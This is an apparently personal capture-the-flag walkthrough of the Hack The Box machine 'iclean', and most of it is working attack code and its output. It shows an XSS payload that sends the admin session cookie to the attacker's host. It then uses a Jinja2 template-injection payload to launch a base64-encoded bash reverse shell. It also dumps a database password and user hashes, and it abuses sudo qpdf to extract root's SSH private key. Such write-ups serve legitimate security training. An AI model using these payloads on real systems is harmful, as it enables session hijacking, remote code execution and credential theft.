
https://www.hackthebox.com/achievement/machine/1777380/596
## Enumeration

###### the story
-XSS allows an attacker to execute **JavaScript** in the victim's browser, potentially stealing sensitive information like session cookies.
- When an **admin visits** the infected page, their session cookie is sent to the attacker's server.
- Use the stolen cookie to **hijack the admin session** and gain access to the admin dashboard.
---
-The **admin dashboard** has a section where users can **generate templates**
-If the application uses an unsafe **template engine** (like Jinja2, Twig, or Smarty), it may be vulnerable to **Server-Side Template Injection (SSTI)**.
-SSTI allows execution of arbitrary **server-side code**.

---
Target IP Address: `10.10.11.12`
-in firefox <> http://`10.10.11.12`/ we directed to `http://capiclean.htb/` + nothing shown
-edit /etc/hosts file add the domain capiclean.htb
```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ ping capiclean.htb  , to make sure !
```
-refresh the website and yes! here we go
-there is login panel try default cred , [no easy win]
-check burp suit intercept connection , or inspect
-i checked the header , `Server: Werkzeug/2.3.7 Python/3.10.12`
```bash
This tells us:
1- The backend is running Flask(minimal webpage framework), a Python-based web framework.
2-Werkzeug is the WSGI (Web Server Gateway Interface) server used by Flask to handle HTTP requests.
3-Flask applications sometimes run in debug mode, which can be exploited.
4-Flask is commonly vulnerable to Server-Side Template Injection (SSTI).
```
-run gobuster
```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ sudo gobuster dir -u http://capiclean.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt

---
/login                (Status: 200) [Size: 2106]
/logout               (Status: 302) [Size: 189] [--> /]
/about                (Status: 200) [Size: 5267]
/services             (Status: 200) [Size: 8592]
/.                    (Status: 200) [Size: 16697]
/dashboard            (Status: 302) [Size: 189] [--> /]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
```

## pre-exploitation
-when we modify parameters and send it to the website , nothing reflected on the webpage what ever the request
-xss <> cookies stealing !
-http://capiclean.htb/quote check
```bash
in burpsuit:
service=Carpet+Cleaning&service=Tile+%26+Grout&email=aaa%40gmail.com
```

```xss
<img src=x onerror=fetch(‘http://10.10.14.4:8888/?c=’+document.cookie);>

after encoding
service=%3Cimg%20src%3Dx%20onerror%3Dfetch%28%27http%3A%2F%2F10.10.14.4%3A8888%2F%3Fc%3D%27%2Bdocument.cookie%29%3E&service=Tile%20%26%20Grout&email=aaa%40gmail.com
```

```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ nc -nlvp 8888            
listening on [any] 8888 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.12] 60932
GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Z6BIvw.VWUdY31-3wsajnnoBBgBhaRY9jw HTTP/1.1
Host: 10.10.14.4:8888
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/

---
first:
eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ

```
-This is a **Flask session cookie**, which is used to store user login information on the website.
-**How Does It Work?**
- When you log in, the website gives you a **session cookie**.
- This cookie tells the website **who you are** (normal user, admin, etc.).
- The website reads this cookie every time you visit a page to check your role.
```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ echo "eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ==" | base64 -d

{"role":"21232f297a57a5a743894a0e4a801fc3"}    
md5 hash

```
-Inside the cookie, there's a **hidden role** that might tell the website whether you're a normal user or an admin.
-Flask **session cookies** store user information **inside the cookie itself**, rather than on the server
```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ echo -n "admin" | md5sum
21232f297a57a5a743894a0e4a801fc3
```
-The application may **default all users to an "admin" role**, even if they are not actually admins.
![[Pasted image 20250203091718.png]]
-/dashboard
-**Server-Side Template Injection (SSTI)**.?
![[Pasted image 20250203092806.png]]

![[Pasted image 20250203092728.png]]
-**Server-Side Template Injection (SSTI)** valid
Common template expressions:
    {{7*7}} for Jinja2 (Python).
Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
-in google <> ssti flask revesre shell
https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
-```
```markdown

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85OTk3ICAwPiYx | base64 -d | bash')|attr('read')()}}

```
id
```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.4/9997 0>&1' | base64 -w0

                                                                                                                   
┌──(pwn㉿kali)-[~/iclean]
└─$ echo -n 'bash -i >& /dev/tcp/10.10.14.4/9997 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Lzk5OTcgMD4mMQ==                                                                                                                   
┌──(pwn㉿kali)-[~/iclean]
└─$ echo -n 'bash -i  >& /dev/tcp/10.10.14.4/9997 0>&1' | base64 -w0
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85OTk3IDA+JjE=                                                                                                                   
┌──(pwn㉿kali)-[~/iclean]
└─$ echo -n 'bash -i  >& /dev/tcp/10.10.14.4/9997  0>&1' | base64 -w0
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85OTk3ICAwPiYx 
```



```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ cat revshell
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85OTk3ICAwPiYx | base64 -d | bash')|attr('read')()}}

                                                                                                                   
┌──(pwn㉿kali)-[~/iclean]
└─$ nc -nlvp 9997
listening on [any] 9997 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.12] 50802
bash: cannot set terminal process group (1212): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ 

```
## post-exploitation
-upgrade ttyshell
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo ;fg


![[Pasted image 20250203101834.png]]
-its web server so there is database !
-check /env
-cat app.py
-# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
```bash
www-data@iclean:/opt/app$ mysql -u iclean -p
Enter password: 

```

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use capiclean

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;


+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql> 

```

mysql> select username,password from users;
+----------+------------------------------------------------------------------+
| username | password                                                         |
+----------+------------------------------------------------------------------+
| admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 |
| consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa |
+----------+------------------------------------------------------------------+

---
#### 
pass1:
 simple and clean 
![[Pasted image 20250203110120.png]]
```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```


```bash
consuela@iclean:~$ find / -name *.pdf 2>/dev/null
/usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf

```


/_dev/shm is a temporary file storage filesystem_, ie, tmpfs, that uses RAM for the backing store.

```bash
consuela@iclean:/dev/shm$ sudo qpdf my.pdf --add-attachment /root/.ssh/id_rsa -- out.pdf

consuela@iclean:/dev/shm$ sudo qpdf --list-attachments out.pdf
id_rsa -> 653,0



consuela@iclean:/dev/shm$ sudo qpdf --show-attachment=id_rsa out.pdf
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
consuela@iclean:/dev/shm$ 

```

```bash
┌──(pwn㉿kali)-[~/iclean]
└─$ sudo ssh -i root.rsa root@10.10.11.12
```
![[Pasted image 20250203110229.png]]


![[Pasted image 20250203110310.png]]